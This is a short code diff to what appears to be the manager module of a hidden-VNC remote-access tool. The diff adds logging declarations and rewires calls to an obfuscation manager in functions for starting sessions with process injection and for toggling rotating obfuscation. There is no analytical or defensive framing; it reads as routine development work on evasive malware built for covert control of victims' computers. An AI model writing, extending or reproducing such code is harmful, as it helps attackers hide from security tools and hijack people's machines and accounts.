@@ -1,4 +1,5 @@
 #include "hvnc_manager.h"
+#include "../common.h"
 #include <tlhelp32.h>
 #include <psapi.h>
 #include <algorithm>
@@ -16,6 +17,8 @@
 #endif
 
 extern "C" {
+    void LogInfo(const char* message);
+    void LogError(const char* message);
     void LogWarning(const char* message);
 }
 
@@ -749,7 +752,7 @@ bool HVNCManager::StartSessionWithInjection(int injectionType) {
     currentInjectionType_ = injectionType;
     
     // Initialize obfuscation manager
-    Obfuscation::ObfuscationManager::GetInstance().Initialize();
+    g_obfuscation_manager.Enable(true);
     AutoRotation::RotationManager::GetInstance().Initialize();
     
     if (obfuscationEnabled_) {
@@ -867,11 +870,11 @@ void HVNCManager::EnableObfuscation(bool enable) {
     
     if (enable) {
         LogInfo("[HVNC] Obfuscation enabled");
-        Obfuscation::ObfuscationManager::GetInstance().EnableGlobalRotation(true, 300000);
+        g_obfuscation_manager.Enable(true);
         AutoRotation::RotationManager::GetInstance().SetMasterRotationEnabled(true);
     } else {
         LogInfo("[HVNC] Obfuscation disabled");
-        Obfuscation::ObfuscationManager::GetInstance().EnableGlobalRotation(false);
+        g_obfuscation_manager.Disable();
         AutoRotation::RotationManager::GetInstance().SetMasterRotationEnabled(false);
     }
 }
